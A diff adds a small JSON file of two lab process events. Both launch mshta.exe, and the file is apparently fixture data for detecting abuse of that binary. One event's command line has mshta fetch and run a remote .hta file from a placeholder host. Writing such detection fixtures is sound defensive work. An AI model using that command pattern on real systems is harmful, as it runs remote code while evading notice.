@@ -1,0 +1,16 @@
+[
+  {
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "mshta.exe https://example.invalid/demo.hta",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "LAB\\analyst",
+    "Computer": "LAB-01"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "mshta.exe javascript:close()",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "LAB\\analyst",
+    "Computer": "LAB-02"
+  }
+]
